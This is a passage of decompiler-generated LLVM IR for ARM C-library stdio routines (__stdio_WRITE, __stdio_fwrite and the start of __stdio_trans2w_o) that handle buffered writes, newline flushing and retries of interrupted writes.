  store i32 %arg3.v0_1285c, i32* %r0.global-to-local, align 4
  %v2_128bc22 = icmp eq i32 %arg3.v0_1285c, 0
  store i1 %v2_128bc22, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_128bc22, label %dec_label_pc_128c4, label %dec_label_pc_12874

dec_label_pc_12874:                               ; preds = %.thread14.thread, %dec_label_pc_128b4.dec_label_pc_12874_crit_edge
  %v2_128a8 = phi i32 [ %v2_128b4, %dec_label_pc_128b4.dec_label_pc_12874_crit_edge ], [ %v2_128a828, %.thread14.thread ]
  %v0_12880 = phi i32 [ %v0_12874.pre, %dec_label_pc_128b4.dec_label_pc_12874_crit_edge ], [ %v2_12868, %.thread14.thread ]
  %v1_12874 = inttoptr i32 %v0_12880 to i32*
  %v2_12874 = load i32, i32* %v1_12874, align 4
  %v7_12878 = icmp eq i32 %v2_12874, 127
  store i1 %v7_12878, i1* %cpsr_z.global-to-local, align 1
  %v1_1287c = urem i32 %v2_12874, 256
  store i32 %v1_1287c, i32* @ip, align 4
  %v1_12880 = add i32 %v0_12880, 4
  store i32 %v1_12880, i32* %r2.global-to-local, align 4
  %tmp45 = icmp ult i32 %v2_12874, 128
  br i1 %tmp45, label %dec_label_pc_128a4, label %dec_label_pc_12888

dec_label_pc_12888:                               ; preds = %dec_label_pc_12874
  store i32 67788, i32* %r2.global-to-local, align 4
  %v0_1288c = call i32 @__aeabi_read_tp()
  store i32 %v0_1288c, i32* %r0.global-to-local, align 4
  %v3_12890 = load i16, i16* @global_var_23164.175, align 2
  %v4_12890 = sext i16 %v3_12890 to i32
  store i32 %v4_12890, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r1, align 4
  %v3_1289c = add i32 %v4_12890, %v0_1288c
  %v4_1289c = inttoptr i32 %v3_1289c to i32*
  store i32 84, i32* %v4_1289c, align 4
  %v0_128d0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_128d0

dec_label_pc_128a4:                               ; preds = %dec_label_pc_12874
  %v2_128a4 = icmp eq i32 %v1_1287c, 0
  store i1 %v2_128a4, i1* %cpsr_z.global-to-local, align 1
  %v1_128a8 = trunc i32 %v2_12874 to i8
  %v3_128a8 = inttoptr i32 %v2_128a8 to i8*
  store i8 %v1_128a8, i8* %v3_128a8, align 1
  %v0_128ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_128ac, label %.dec_label_pc_128c4_crit_edge, label %dec_label_pc_128b4

dec_label_pc_128b4:                               ; preds = %dec_label_pc_128a4
  %v0_128b4 = load i32, i32* %lr.global-to-local, align 4
  %v1_128b4 = load i32, i32* %r4.global-to-local, align 4
  %v2_128b4 = add i32 %v1_128b4, %v0_128b4
  store i32 %v2_128b4, i32* %lr.global-to-local, align 4
  %v0_128b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_128b8 = add i32 %v0_128b8, -1
  store i32 %v1_128b8, i32* %r0.global-to-local, align 4
  %v2_128bc = icmp eq i32 %v1_128b8, 0
  store i1 %v2_128bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_128bc, label %dec_label_pc_128c4, label %dec_label_pc_128b4.dec_label_pc_12874_crit_edge

dec_label_pc_128b4.dec_label_pc_12874_crit_edge:  ; preds = %dec_label_pc_128b4
  %v0_12874.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12874

.dec_label_pc_128c4_crit_edge:                    ; preds = %dec_label_pc_128a4
  %v1_128ac = load i32, i32* @ip, align 4
  store i32 %v1_128ac, i32* %r2.global-to-local, align 4
  %v0_128c4.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_128c4

dec_label_pc_128c4:                               ; preds = %dec_label_pc_128b4, %.dec_label_pc_128c4_crit_edge, %.thread14.thread
  %v0_128c4 = phi i32 [ %v0_128c4.pre, %.dec_label_pc_128c4_crit_edge ], [ %v2_128a828, %.thread14.thread ], [ %v2_128b4, %dec_label_pc_128b4 ]
  %v1_128c4 = load i32, i32* @sp, align 4
  %v9_128c4 = icmp eq i32 %v0_128c4, %v1_128c4
  store i1 %v9_128c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_128c4, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_128c4
  %v1_128c8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_128c8, i32* %v1_12868, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_128c4, %bb43
  %v0_128cc = load i32, i32* %r0.global-to-local, align 4
  %v1_128cc = load i32, i32* %r5.global-to-local, align 4
  %v2_128cc = sub i32 %v1_128cc, %v0_128cc
  store i32 %v2_128cc, i32* @r1, align 4
  br label %dec_label_pc_128d0

dec_label_pc_128d0:                               ; preds = %dec_label_pc_12888, %bb44
  %v0_128d0 = phi i32 [ %v0_128d0.pre, %dec_label_pc_12888 ], [ %v2_128cc, %bb44 ]
  store i32 %v0_128d0, i32* %r0.global-to-local, align 4
  %v2_128d8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_128d8, i32* %r4.global-to-local, align 4
  ret i32 %v0_128d0

; uselistorder directives
  uselistorder i32 %v0_128d0, { 1, 0 }
  uselistorder i32 %v1_128b8, { 1, 0 }
  uselistorder i32 %v2_128b4, { 0, 2, 1 }
  uselistorder i32 %v1_1287c, { 1, 0 }
  uselistorder i32 %v2_12874, { 2, 0, 1, 3 }
  uselistorder i32 %v2_128a828, { 1, 0 }
  uselistorder i32 %v2_128341, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 6, 1, 4, 2, 3, 5, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 6, 1, 0 }
  uselistorder i32* %lr.global-to-local, { 4, 2, 5, 0, 3, 1, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 5, 2, 3, 4, 9, 6, 0, 7, 8 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_128d0, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_128c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12874, { 1, 0 }
  uselistorder label %.thread14.thread, { 2, 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v15_128e4 = load i32, i32* @r8, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_129a82 = icmp eq i32 %arg3, 0
  store i1 %v2_129a82, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_129a82, label %dec_label_pc_129b0, label %dec_label_pc_12900

dec_label_pc_12900:                               ; preds = %entry, %dec_label_pc_129a8thread-pre-split.dec_label_pc_12900_crit_edge
  %v0_1290c = phi i32 [ %v0_1290c.pre, %dec_label_pc_129a8thread-pre-split.dec_label_pc_12900_crit_edge ], [ %tmp, %entry ]
  %v0_12908 = phi i32 [ %v5_12918, %dec_label_pc_129a8thread-pre-split.dec_label_pc_12900_crit_edge ], [ %arg2, %entry ]
  %v3_12900 = phi i32 [ %v3_12900.pre, %dec_label_pc_129a8thread-pre-split.dec_label_pc_12900_crit_edge ], [ 2147483647, %entry ]
  %v0_12904.in = phi i32 [ %v5_1291c, %dec_label_pc_129a8thread-pre-split.dec_label_pc_12900_crit_edge ], [ %arg3, %entry ]
  %v3_12904 = phi i32 [ %v5_1291c, %dec_label_pc_129a8thread-pre-split.dec_label_pc_12900_crit_edge ], [ %arg3, %entry ]
  %v0_12904 = icmp slt i32 %v0_12904.in, 0
  %storemerge = select i1 %v0_12904, i32 %v3_12900, i32 %v3_12904
  store i32 %storemerge, i32* @r2, align 4
  %v1_1290c = add i32 %v0_1290c, 4
  %v2_1290c = inttoptr i32 %v1_1290c to i32*
  %v3_1290c = load i32, i32* %v2_1290c, align 4
  %v3_12910 = call i32 @__GI___libc_write(i32 %v3_1290c, i32 %v0_12908)
  %v1_12914 = icmp slt i32 %v3_12910, 0
  %v2_12914 = icmp eq i32 %v3_12910, 0
  store i1 %v2_12914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_12914, label %dec_label_pc_12924, label %dec_label_pc_129a8thread-pre-split

dec_label_pc_12924:                               ; preds = %dec_label_pc_12900
  %v0_12924 = load i32, i32* @r4, align 4
  %v1_12924 = inttoptr i32 %v0_12924 to i16*
  %v2_12924 = load i16, i16* %v1_12924, align 2
  %v1_12928 = or i16 %v2_12924, 8
  store i16 %v1_12928, i16* %v1_12924, align 2
  store i32 67620, i32* %r3.global-to-local, align 4
  %v0_12934 = call i32 @__aeabi_read_tp()
  %v3_12938 = load i16, i16* @global_var_23164.175, align 2
  %v4_12938 = sext i16 %v3_12938 to i32
  store i32 %v4_12938, i32* %r3.global-to-local, align 4
  %v2_1293c = add i32 %v4_12938, %v0_12934
  %v3_1293c = inttoptr i32 %v2_1293c to i32*
  %v4_1293c = load i32, i32* %v3_1293c, align 4
  store i32 %v4_1293c, i32* %r3.global-to-local, align 4
  %v7_12940 = icmp eq i32 %v4_1293c, 4
  store i1 %v7_12940, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12940, label %dec_label_pc_1294c, label %bb21

bb21:                                             ; preds = %dec_label_pc_12924
  %v8_12944 = icmp eq i32 %v4_1293c, 11
  store i1 %v8_12944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_12944, label %dec_label_pc_1294c, label %dec_label_pc_129b0

dec_label_pc_1294c:                               ; preds = %dec_label_pc_12924, %bb21
  %v0_1294c = load i32, i32* @r4, align 4
  %v1_1294c = add i32 %v0_1294c, 8
  store i32 %v1_1294c, i32* %r2.global-to-local, align 4
  %v1_12950 = inttoptr i32 %v1_1294c to i32*
  %v2_12950 = load i32, i32* %v1_12950, align 4
  store i32 %v2_12950, i32* %r2.global-to-local, align 4
  %v3_12950 = add i32 %v0_1294c, 12
  %v4_12950 = inttoptr i32 %v3_12950 to i32*
  %v5_12950 = load i32, i32* %v4_12950, align 4
  store i32 %v5_12950, i32* %r3.global-to-local, align 4
  %v2_12954 = sub i32 %v5_12950, %v2_12950
  store i32 %v2_12954, i32* @r1, align 4
  %v9_12954 = icmp eq i32 %v5_12950, %v2_12950
  store i1 %v9_12954, i1* %cpsr_z.global-to-local, align 1
  %v0_129a0.pre = load i32, i32* @r5, align 4
  br i1 %v9_12954, label %dec_label_pc_129a0, label %dec_label_pc_1295c

dec_label_pc_1295c:                               ; preds = %dec_label_pc_1294c
  %v3_1295c = icmp ult i32 %v2_12954, %v0_129a0.pre
  %v9_1295c = icmp eq i32 %v2_12954, %v0_129a0.pre
  store i1 %v9_1295c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1295c, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_1295c
  store i32 %v0_129a0.pre, i32* @r1, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_1295c, %bb22, %dec_label_pc_12984
  %v2_12970 = phi i32 [ %v1_12988, %dec_label_pc_12984 ], [ %v2_12950, %bb22 ], [ %v2_12950, %dec_label_pc_1295c ]
  %v0_12964 = load i32, i32* @r6, align 4
  %v1_12964 = inttoptr i32 %v0_12964 to i8*
  %v2_12964 = load i8, i8* %v1_12964, align 1
  %v3_12964 = zext i8 %v2_12964 to i32
  store i32 %v3_12964, i32* %r3.global-to-local, align 4
  %v7_12968 = icmp eq i8 %v2_12964, 10
  store i1 %v7_12968, i1* %cpsr_z.global-to-local, align 1
  %v1_1296c = add i32 %v0_12964, 1
  store i32 %v1_1296c, i32* @r6, align 4
  %v3_12970 = inttoptr i32 %v2_12970 to i8*
  store i8 %v2_12964, i8* %v3_12970, align 1
  %v0_12974 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12974, label %dec_label_pc_12978, label %dec_label_pc_12984

dec_label_pc_12978:                               ; preds = %.preheader
  %v0_12978 = load i32, i32* @r4, align 4
  %v1_12978 = inttoptr i32 %v0_12978 to i16*
  %v2_12978 = load i16, i16* %v1_12978, align 2
  %v3_12978 = zext i16 %v2_12978 to i32
  store i32 %v3_12978, i32* %r3.global-to-local, align 4
  %v1_1297c = and i32 %v3_12978, 256
  %v2_1297c = icmp eq i32 %v1_1297c, 0
  store i1 %v2_1297c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1297c, label %dec_label_pc_12984, label %dec_label_pc_12978.dec_label_pc_12990_crit_edge

dec_label_pc_12978.dec_label_pc_12990_crit_edge:  ; preds = %dec_label_pc_12978
  %v0_12994.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12990

dec_label_pc_12984:                               ; preds = %dec_label_pc_12978, %.preheader
  %v0_12984 = load i32, i32* @r1, align 4
  %v1_12984 = add i32 %v0_12984, -1
  store i32 %v1_12984, i32* @r1, align 4
  %v7_12984 = icmp eq i32 %v0_12984, 1
  store i1 %v7_12984, i1* %cpsr_z.global-to-local, align 1
  %v0_12988 = load i32, i32* %r2.global-to-local, align 4
  %v1_12988 = add i32 %v0_12988, 1
  store i32 %v1_12988, i32* %r2.global-to-local, align 4
  br i1 %v7_12984, label %dec_label_pc_12984.dec_label_pc_12990_crit_edge, label %.preheader

dec_label_pc_12984.dec_label_pc_12990_crit_edge:  ; preds = %dec_label_pc_12984
  %v0_12990.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12990

dec_label_pc_12990:                               ; preds = %dec_label_pc_12978.dec_label_pc_12990_crit_edge, %dec_label_pc_12984.dec_label_pc_12990_crit_edge
  %v0_12994 = phi i32 [ %v1_12988, %dec_label_pc_12984.dec_label_pc_12990_crit_edge ], [ %v0_12994.pre, %dec_label_pc_12978.dec_label_pc_12990_crit_edge ]
  %v0_12990 = phi i32 [ %v0_12990.pre, %dec_label_pc_12984.dec_label_pc_12990_crit_edge ], [ %v0_12978, %dec_label_pc_12978.dec_label_pc_12990_crit_edge ]
  %v1_12990 = add i32 %v0_12990, 8
  %v2_12990 = inttoptr i32 %v1_12990 to i32*
  %v3_12990 = load i32, i32* %v2_12990, align 4
  store i32 %v3_12990, i32* %r3.global-to-local, align 4
  %v2_12994 = add i32 %v0_12990, 16
  %v3_12994 = inttoptr i32 %v2_12994 to i32*
  store i32 %v0_12994, i32* %v3_12994, align 4
  %v0_12998 = load i32, i32* %r3.global-to-local, align 4
  %v1_12998 = load i32, i32* %r2.global-to-local, align 4
  %v2_12998 = sub i32 %v1_12998, %v0_12998
  store i32 %v2_12998, i32* %r3.global-to-local, align 4
  %v1_1299c = load i32, i32* @r5, align 4
  %v2_1299c = sub i32 %v1_1299c, %v2_12998
  br label %dec_label_pc_129a0

dec_label_pc_129a0:                               ; preds = %dec_label_pc_1294c, %dec_label_pc_12990
  %v0_129a0 = phi i32 [ %v2_1299c, %dec_label_pc_12990 ], [ %v0_129a0.pre, %dec_label_pc_1294c ]
  %v1_129a0 = load i32, i32* @r7, align 4
  %v2_129a0 = sub i32 %v1_129a0, %v0_129a0
  store i32 %v2_129a0, i32* @r7, align 4
  br label %dec_label_pc_129b0

dec_label_pc_129a8thread-pre-split:               ; preds = %dec_label_pc_12900
  %v3_12918 = load i32, i32* @r6, align 4
  %v5_12918 = add i32 %v3_12918, %v3_12910
  store i32 %v5_12918, i32* @r6, align 4
  %v4_1291c = load i32, i32* @r5, align 4
  %v5_1291c = sub i32 %v4_1291c, %v3_12910
  store i32 %v5_1291c, i32* @r5, align 4
  %v2_129a8 = icmp eq i32 %v5_1291c, 0
  store i1 %v2_129a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_129a8, label %dec_label_pc_129b0, label %dec_label_pc_129a8thread-pre-split.dec_label_pc_12900_crit_edge

dec_label_pc_129a8thread-pre-split.dec_label_pc_12900_crit_edge: ; preds = %dec_label_pc_129a8thread-pre-split
  %v3_12900.pre = load i32, i32* @r8, align 4
  %v0_1290c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12900

dec_label_pc_129b0:                               ; preds = %dec_label_pc_129a8thread-pre-split, %entry, %bb21, %dec_label_pc_129a0
  %v0_129b0 = load i32, i32* @r7, align 4
  store i32 %v15_128e4, i32* @r8, align 4
  ret i32 %v0_129b0

; uselistorder directives
  uselistorder i32 %v5_1291c, { 1, 3, 0, 2 }
  uselistorder i32 %v5_12918, { 1, 0 }
  uselistorder i32 %v0_12990, { 1, 0 }
  uselistorder i32 %v1_12988, { 0, 2, 1 }
  uselistorder i32 %v0_12984, { 1, 0 }
  uselistorder i32 %v0_129a0.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_12950, { 1, 0, 2 }
  uselistorder i32 %v2_12950, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_12910, { 1, 0, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 1, 4, 2, 5, 6, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 10, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_129b0, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_129a0, { 1, 0 }
  uselistorder label %dec_label_pc_12990, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1294c, { 1, 0 }
  uselistorder label %dec_label_pc_12900, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_129c0 = load i32, i32* @r4, align 4
  store i32 %v3_129c0, i32* %stack_var_-20, align 4
  %v6_129c0 = load i32, i32* @r5, align 4
  %v9_129c0 = load i32, i32* @r6, align 4
  %v12_129c0 = load i32, i32* @r7, align 4
  %v3_129c4 = load i16, i16* %arg3, align 2
  %v4_129c4 = zext i16 %v3_129c4 to i32
  store i32 %v4_129c4, i32* @r3, align 4
  %v1_129c8 = and i32 %v4_129c4, 512
  store i32 %v1_129c8, i32* @r4, align 4
  %v2_129c8 = icmp eq i32 %v1_129c8, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_129c8, label %dec_label_pc_129e0, label %dec_label_pc_12adc

dec_label_pc_129e0:                               ; preds = %entry
  %v2_129e0 = add i32 %tmp, 4
  %v3_129e0 = inttoptr i32 %v2_129e0 to i32*
  %v4_129e0 = load i32, i32* %v3_129e0, align 4
  %v2_129e8 = add i32 %tmp, 16
  %v3_129e8 = inttoptr i32 %v2_129e8 to i32*
  %v4_129e8 = load i32, i32* %v3_129e8, align 4
  store i32 %v4_129e8, i32* @r0, align 4
  %v2_129ec = add i32 %tmp, 12
  %v3_129ec = inttoptr i32 %v2_129ec to i32*
  %v4_129ec = load i32, i32* %v3_129ec, align 4
  store i32 %v4_129ec, i32* @r3, align 4
  %v4_129f0 = icmp eq i32 %v4_129e0, -2
  %v2_129f4 = sub i32 %v4_129ec, %v4_129e8
  br i1 %v4_129f0, label %dec_label_pc_129f4, label %dec_label_pc_12a1c

dec_label_pc_129f4:                               ; preds = %dec_label_pc_129e0
  %v3_129f8 = icmp ugt i32 %v2_129f4, %arg2
  br i1 %v3_129f8, label %bb, label %bb12

bb:                                               ; preds = %dec_label_pc_129f4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_129f4, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_129f4, %dec_label_pc_129f4 ]
  %v0_12a00 = phi i32 [ %arg2, %bb ], [ %v2_129f4, %dec_label_pc_129f4 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_12a00, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_12a08 = call i32 @memcpy()
  %v0_12a0c = load i32, i32* @r5, align 4
  %v1_12a0c = add i32 %v0_12a0c, 16
  %v2_12a0c = inttoptr i32 %v1_12a0c to i32*
  %v3_12a0c = load i32, i32* %v2_12a0c, align 4
  %v1_12a10 = load i32, i32* @r4, align 4
  %v2_12a10 = add i32 %v1_12a10, %v3_12a0c
  store i32 %v2_12a10, i32* %v2_12a0c, align 4
  br label %dec_label_pc_12af0

dec_label_pc_12a1c:                               ; preds = %dec_label_pc_129e0
  store i32 %v2_129f4, i32* @r3, align 4
  %tmp18 = icmp ult i32 %v2_129f4, %arg2
  br i1 %tmp18, label %dec_label_pc_12abc, label %dec_label_pc_12a28

dec_label_pc_12a28:                               ; preds = %dec_label_pc_12a1c
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_12a30 = call i32 @memcpy()
  %v0_12a34 = load i32, i32* @r5, align 4
  %v1_12a34 = add i32 %v0_12a34, 16
  %v2_12a34 = inttoptr i32 %v1_12a34 to i32*
  %v3_12a34 = load i32, i32* %v2_12a34, align 4
  %v1_12a38 = inttoptr i32 %v0_12a34 to i16*
  %v2_12a38 = load i16, i16* %v1_12a38, align 2
  %v1_12a3c = load i32, i32* @r6, align 4
  %v2_12a3c = add i32 %v1_12a3c, %v3_12a34
  %v1_12a40 = and i16 %v2_12a38, 256
  %v2_12a40 = icmp eq i16 %v1_12a40, 0
  store i32 %v2_12a3c, i32* %v2_12a34, align 4
  br i1 %v2_12a40, label %dec_label_pc_12af0, label %dec_label_pc_12a4c

dec_label_pc_12a4c:                               ; preds = %dec_label_pc_12a28
  %v0_12a4c = load i32, i32* @r7, align 4
  %v0_12a54 = load i32, i32* @r6, align 4
  %v4_12a58 = call i32 @memrchr(i32 %v0_12a4c, i32 10, i32 %v0_12a54, i32 %v2_12a3c)
  %v2_12a5c = icmp eq i32 %v4_12a58, 0
  br i1 %v2_12a5c, label %dec_label_pc_12af0, label %dec_label_pc_12a64

dec_label_pc_12a64:                               ; preds = %dec_label_pc_12a4c
  %v0_12a64 = load i32, i32* @r5, align 4
  store i32 %v0_12a64, i32* @r0, align 4
  %v0_12a68 = call i32 @__stdio_wcommit()
  %v2_12a6c = icmp eq i32 %v0_12a68, 0
  br i1 %v2_12a6c, label %dec_label_pc_12af0, label %dec_label_pc_12a74

dec_label_pc_12a74:                               ; preds = %dec_label_pc_12a64
  %v1_12a74 = load i32, i32* @r6, align 4
  %v3_12a74 = icmp uge i32 %v0_12a68, %v1_12a74
  %v1_12a74.v0_12a68 = select i1 %v3_12a74, i32 %v1_12a74, i32 %v0_12a68
  store i32 %v1_12a74.v0_12a68, i32* @r4, align 4
  %v2_12a80 = sub i32 %v1_12a74, %v1_12a74.v0_12a68
  %v0_12a84 = load i32, i32* @r7, align 4
  %v2_12a84 = add i32 %v0_12a84, %v2_12a80
  store i32 %v2_12a84, i32* %r7.global-to-local, align 4
  store i32 %v2_12a84, i32* @r0, align 4
  store i32 %v1_12a74.v0_12a68, i32* @r2, align 4
  %v4_12a94 = call i32 @__GI_memchr(i32 %v2_12a84, i32 10, i32 %v1_12a74.v0_12a68, i32 %v2_12a80)
  %v2_12a98 = icmp eq i32 %v4_12a94, 0
  br i1 %v2_12a98, label %dec_label_pc_12af0, label %dec_label_pc_12aa0

dec_label_pc_12aa0:                               ; preds = %dec_label_pc_12a74
  %v0_12aa0 = load i32, i32* @r5, align 4
  %v1_12aa0 = add i32 %v0_12aa0, 16
  %v2_12aa0 = inttoptr i32 %v1_12aa0 to i32*
  %v3_12aa0 = load i32, i32* %v2_12aa0, align 4
  %v0_12aa4 = load i32, i32* %r7.global-to-local, align 4
  %v1_12aa4 = load i32, i32* @r4, align 4
  %v2_12aa4 = sub i32 %v0_12aa4, %v4_12a94
  %v2_12aa8 = add i32 %v2_12aa4, %v1_12aa4
  %v2_12aac = sub i32 %v3_12aa0, %v2_12aa8
  %v1_12ab0 = load i32, i32* @r6, align 4
  %v2_12ab0 = sub i32 %v1_12ab0, %v2_12aa8
  store i32 %v2_12ab0, i32* @r6, align 4
  store i32 %v2_12aac, i32* %v2_12aa0, align 4
  br label %dec_label_pc_12af0

dec_label_pc_12abc:                               ; preds = %dec_label_pc_12a1c
  %v2_12abc = add i32 %tmp, 8
  %v3_12abc = inttoptr i32 %v2_12abc to i32*
  %v4_12abc = load i32, i32* %v3_12abc, align 4
  store i32 %v4_12abc, i32* @r3, align 4
  %v9_12ac0 = icmp eq i32 %v4_129e8, %v4_12abc
  br i1 %v9_12ac0, label %dec_label_pc_12adc, label %dec_label_pc_12ac8

dec_label_pc_12ac8:                               ; preds = %dec_label_pc_12abc
  store i32 %tmp, i32* @r0, align 4
  %v0_12acc = call i32 @__stdio_wcommit()
  %v2_12ad0 = icmp eq i32 %v0_12acc, 0
  br i1 %v2_12ad0, label %dec_label_pc_12ac8.dec_label_pc_12adc_crit_edge, label %bb15

dec_label_pc_12ac8.dec_label_pc_12adc_crit_edge:  ; preds = %dec_label_pc_12ac8
  %v0_12adc.pre = load i32, i32* @r6, align 4
  %v0_12ae0.pre = load i32, i32* @r5, align 4
  %v0_12ae4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12adc

bb15:                                             ; preds = %dec_label_pc_12ac8
  %v1_12ad4 = load i32, i32* @r4, align 4
  store i32 %v1_12ad4, i32* @r6, align 4
  br label %dec_label_pc_12af0

dec_label_pc_12adc:                               ; preds = %dec_label_pc_12ac8.dec_label_pc_12adc_crit_edge, %entry, %dec_label_pc_12abc
  %v0_12ae4 = phi i32 [ %v0_12ae4.pre, %dec_label_pc_12ac8.dec_label_pc_12adc_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_12abc ]
  %v0_12ae0 = phi i32 [ %v0_12ae0.pre, %dec_label_pc_12ac8.dec_label_pc_12adc_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_12abc ]
  %v0_12adc = phi i32 [ %v0_12adc.pre, %dec_label_pc_12ac8.dec_label_pc_12adc_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_12abc ]
  %v1_12ae0 = inttoptr i32 %v0_12ae0 to i16*
  %v5_12ae8 = call i32 @__stdio_WRITE(i16* %v1_12ae0, i32 %v0_12ae4, i32 %v0_12adc)
  store i32 %v5_12ae8, i32* @r6, align 4
  br label %dec_label_pc_12af0

dec_label_pc_12af0:                               ; preds = %bb15, %dec_label_pc_12a74, %dec_label_pc_12a64, %dec_label_pc_12a4c, %dec_label_pc_12a28, %dec_label_pc_12aa0, %bb12, %dec_label_pc_12adc
  %v0_12af0 = load i32, i32* @r6, align 4
  %v2_12af8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12af8, i32* @r4, align 4
  store i32 %v6_129c0, i32* @r5, align 4
  store i32 %v9_129c0, i32* @r6, align 4
  store i32 %v12_129c0, i32* @r7, align 4
  ret i32 %v0_12af0

; uselistorder directives
  uselistorder i32 %v2_12aa8, { 1, 0 }
  uselistorder i32 %v2_12a80, { 1, 0 }
  uselistorder i32 %v1_12a74.v0_12a68, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12a74, { 1, 0, 2 }
  uselistorder i32 %v2_129f4, { 2, 4, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_12af0, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_12adc, { 0, 2, 1 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12b00 = load i32, i32* @r4, align 4
  store i32 %v3_12b00, i32* %stack_var_-8, align 4
  %v3_12b04 = load i16, i16* %arg1, align 2
  %v4_12b04 = zext i16 %v3_12b04 to i32
  %v2_12b08 = and i32 %v4_12b04, %arg2
  %v4_12b08 = icmp eq i32 %v2_12b08, 0
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_12b08, label %dec_label_pc_12b14, label %dec_label_pc_12b24

dec_label_pc_12b14:                               ; preds = %entry
  %v1_12b14 = and i32 %v4_12b04, 2176
  %v2_12b14 = icmp eq i32 %v1_12b14, 0
  br i1 %v2_12b14, label %dec_label_pc_12b1c, label %dec_label_pc_12b30

dec_label_pc_12b1c:                               ; preds = %dec_label_pc_12b14
  %v2_12b1c = or i32 %v4_12b04, %arg2
  %v1_12b20 = trunc i32 %v2_12b1c to i16
  store i16 %v1_12b20, i16* %arg1, align 2
  %v0_12b24.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12b24

dec_label_pc_12b24:                               ; preds = %entry, %dec_label_pc_12b1c
  %v0_12b68 = phi i32 [ %tmp, %entry ], [ %v0_12b24.pre, %dec_label_pc_12b1c ]
  %v1_12b24 = inttoptr i32 %v0_12b68 to i16*
  %v2_12b24 = load i16, i16* %v1_12b24, align 2
  %v3_12b24 = zext i16 %v2_12b24 to i32
  store i32 %v3_12b24, i32* @ip, align 4
